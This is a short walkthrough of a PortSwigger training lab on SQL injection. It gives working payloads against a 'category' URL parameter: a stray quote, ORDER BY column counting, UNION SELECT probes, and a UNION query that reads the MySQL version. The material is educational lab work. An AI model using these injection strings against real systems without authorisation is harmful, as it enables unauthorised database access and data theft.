#Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
#https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

```bash
# After choosing Pets from categories you will obtain this link.

web-security-academy.net/filter?category=Pets
# We are getting internal server error by changing the last part

web-security-academy.net/filter?category=Pets'

#Intercept the request with burp suite end send it to repeater

# Since it is MYSQL we will use # to comment
Pets' # 
```
```bash
# Lets Find Column number Increment the order by number until you get error.

Pets' order by 3 #

# We get internal server error by using 3.
```
```bash
# By checking the page after you choose pet category you can see that both of the two columns are string so we will try with string.

Pets' UNION SELECT 'a' , 'a' #

#It works
```
```bash
# To be able to obtain the version and complete the lab we will do this:
Pets' UNION SELECT @@version , NULL #

```
